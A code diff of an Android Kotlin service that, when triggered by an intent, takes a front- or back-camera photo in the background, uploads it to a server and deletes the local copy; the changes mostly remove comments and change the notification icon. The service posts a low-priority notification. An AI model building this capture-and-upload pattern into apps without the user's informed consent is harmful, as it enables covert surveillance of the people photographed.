@@ -39,8 +39,6 @@ class CameraBackgroundService : Service() {
     private var cameraDevice: CameraDevice? = null
     private var imageReader: ImageReader? = null
     private val handler = Handler(Looper.getMainLooper())
-    
-    // ✅ FIX: Make it class-level variable
     private var useFrontCamera: Boolean = true
 
     override fun onCreate() {
@@ -56,7 +54,6 @@ class CameraBackgroundService : Service() {
         // Start as foreground service
         startForeground(NOTIFICATION_ID, createNotification("Capturing photo..."))
 
-        // ✅ FIX: Store in class variable
         useFrontCamera = intent?.getBooleanExtra("use_front_camera", true) ?: true
         Log.d(TAG, "Use front camera: $useFrontCamera")
 
@@ -70,7 +67,6 @@ class CameraBackgroundService : Service() {
         try {
             cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
             
-            // Find camera
             val cameraId = findCamera(useFront)
             if (cameraId == null) {
                 Log.e(TAG, "❌ Camera not found")
@@ -80,7 +76,6 @@ class CameraBackgroundService : Service() {
             
             Log.d(TAG, "Camera ID: $cameraId")
 
-            // Check permission
             if (checkSelfPermission(android.Manifest.permission.CAMERA) 
                 != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                 Log.e(TAG, "❌ No camera permission")
@@ -88,7 +83,6 @@ class CameraBackgroundService : Service() {
                 return
             }
 
-            // Setup ImageReader
             imageReader = ImageReader.newInstance(640, 480, android.graphics.ImageFormat.JPEG, 2)
             
             imageReader?.setOnImageAvailableListener({ reader ->
@@ -100,13 +94,11 @@ class CameraBackgroundService : Service() {
                     image.close()
                 }
                 
-                // Cleanup & stop service
                 closeCamera()
                 stopSelfSafely()
                 
             }, handler)
 
-            // Open camera
             Log.d(TAG, "Opening camera...")
             cameraManager?.openCamera(cameraId, object : CameraDevice.StateCallback() {
                 override fun onOpened(camera: CameraDevice) {
@@ -153,7 +145,6 @@ class CameraBackgroundService : Service() {
                 }
             }
             
-            // Fallback to first camera
             return cameraIds.firstOrNull()
         } catch (e: Exception) {
             Log.e(TAG, "Error finding camera", e)
@@ -168,7 +159,6 @@ class CameraBackgroundService : Service() {
             val captureRequest = cameraDevice?.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
             captureRequest?.addTarget(imageReader!!.surface)
             
-            // Set auto-focus & auto-exposure
             captureRequest?.set(
                 CaptureRequest.CONTROL_AF_MODE,
                 CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE
@@ -219,7 +209,6 @@ class CameraBackgroundService : Service() {
             val bytes = ByteArray(buffer.remaining())
             buffer.get(bytes)
 
-            // Save to temp file
             val file = File(cacheDir, "capture_${System.currentTimeMillis()}.jpg")
             FileOutputStream(file).use { output ->
                 output.write(bytes)
@@ -228,16 +217,14 @@ class CameraBackgroundService : Service() {
             Log.d(TAG, "✅ Image saved: ${file.path}")
             Log.d(TAG, "Image size: ${file.length() / 1024} KB")
 
-            // ✅ FIX: Use class variable and proper camera type string
             val cameraType = if (useFrontCamera) "front" else "back"
             
-            // Send to server via ApiClient
             Thread {
                 try {
                     val success = ApiClient.uploadCapturedPhoto(
                         applicationContext, 
                         file,
-                        cameraType  // ✅ Now properly using the variable
+                        cameraType
                     )
                     
                     if (success) {
@@ -246,7 +233,6 @@ class CameraBackgroundService : Service() {
                         Log.e(TAG, "❌ Failed to upload photo")
                     }
                     
-                    // Delete temp file
                     file.delete()
                     
                 } catch (e: Exception) {
@@ -284,11 +270,12 @@ class CameraBackgroundService : Service() {
     }
 
     private fun createNotification(message: String): Notification {
+        // ✅ FIX: Use android built-in icon instead of custom drawable
         val builder = NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle("Camera Capture")
             .setContentText(message)
-            .setSmallIcon(R.drawable.ic_notification)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setSmallIcon(android.R.drawable.ic_menu_camera) // ✅ Use system icon
+            .setPriority(NotificationCompat.PRIORITY_LOW) // ✅ Use NotificationCompat constant
             .setAutoCancel(true)
 
         return builder.build()
